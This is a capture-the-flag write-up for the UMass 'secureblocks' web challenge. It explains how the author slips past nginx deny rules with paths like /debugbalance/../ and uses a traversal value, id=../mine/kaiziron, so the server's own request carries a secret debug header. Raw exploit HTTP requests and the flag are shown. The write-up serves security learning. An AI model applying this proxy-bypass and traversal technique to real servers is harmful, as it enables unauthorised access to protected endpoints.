# secureblocks [8 solves] [499 points] [First Blood 🩸]

![](https://i.imgur.com/kG1689x.png)

### Description
```
I heard block chain was the cool new thing so I asked my little brother to make me a blockchain website. But I think he was thinking of the wrong kind of blocks...

secureblocks.zip

Ayman#5138

http://secureblocks.web.ctf.umasscybersec.org
```

The objective is to mine diamonds and buy flag with the diamonds

It is running nginx as a proxy and forwarding requests to node that is running locally

Nginx is blocking us from requesting `/buyflag` and `/debugbalance`

```
        location ~* ^/debugbalance {
            deny all;
            return 403;
        }
        location ~* ^/buyflag {
            deny all;
            return 403;
        }
```

We can mine diamonds with `/mine/<id>` 
```js
router.get('/mine/:id',middleware.authReq,async (req,res)=>{
  if(ALLOWED.includes(req.user) || req.headers.debug === process.env.DEBUG_HEADER){
    let user = (await DBHelper.getUser(req.params.id))[0];
    try{
      let diamonds = Math.floor(Math.random()*12) + user.diamonds;
      await DBHelper.editDiamonds(req.params.id,diamonds);
      return res.json({'success':{'diamonds':diamonds}})
    }
    catch(e){
      console.log(e);
      return res.json({'error':"Don't mine at night!"})
    }
  }
  res.json({'error':'Diamonds unavailable at this time.'}).status(403)
})
```

However, it checks if the logged in user is in the allow list, which the allow list only has the admin and there is no way to be included in it

We can also specify a debug header, however we don't know the DEBUG_HEADER environment variable

`/debugbalance` will make a request to localhost with the debug header needed
```js
router.post('/debugbalance/:id',async (req,res)=>{
  let id = req.body.id ? req.body.id : req.params.id;
  try{
    let resp = await fetch(`http://localhost:3000/balance/${id}`,{headers:{
      'DEBUG':process.env.DEBUG_HEADER
    }});
    let text = await resp.text();
    res.json({'success':text});
  }
  catch(e){
    res.json({'error':e})
  }
})
```

We can specify `id` to whatever we want, so we can do directory traversal to access `/mine` with the debug header to mine diamonds for our account

But `/debugbalance` is blocked by nginx, we can bypass that with `/debugbalance/../`, nginx will treat that as `/` but node will read that is `/debugbalance/` with the id of `..` , and we can specify the id for directory traversal in the body of the POST request

```
POST /debugbalance/../ HTTP/1.1
Host: secureblocks.web.ctf.umasscybersec.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secureblocks.web.ctf.umasscybersec.org/dashboard
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

id=../mine/kaiziron
```

Then just make the request few times until we have enough diamonds for buying the flag with `/buyflag/<id>`

```js
router.get('/buyflag/:id',middleware.authReq,async (req,res)=>{
  let result = await DBHelper.getUser(req.user);
  if(result.length>0){
    let user = result[0];
    if(user.diamonds >= 64 && user.name!=='admin'){
      await DBHelper.editDiamonds(req.user,0);
      return res.json({'flag':FLAG});
    }
    return res.json({'error':'not enough diamonds!'})
  }
  res.json({'error':'Could not find character'});
})
```

`/buyflag/<id>` will not actually take the id in the url, but it will get our user by our jwt cookie, so we can use the same way to bypass nginx as node will treat `..` as the id and it is not used at all

```
GET /buyflag/../ HTTP/1.1
Host: secureblocks.web.ctf.umasscybersec.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secureblocks.web.ctf.umasscybersec.org/dashboard
Connection: close
Cookie: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2Fpemlyb24iLCJpYXQiOjE2Nzk3NzM4MzMsImV4cCI6MTY3OTc3NTYzM30.pKJtWYMQQLTBRxCJJH_XOyFk170S_wsWENZDmJFtPzQ


```

Then we will get the flag :
```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 25 Mar 2023 19:50:40 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-ngIowhWFW47ergu0BQYKPRStoIQ"

{"flag":"UMASS{M1N3_D14M0ND$_L1K3_4_B0SS_111222333}"}
```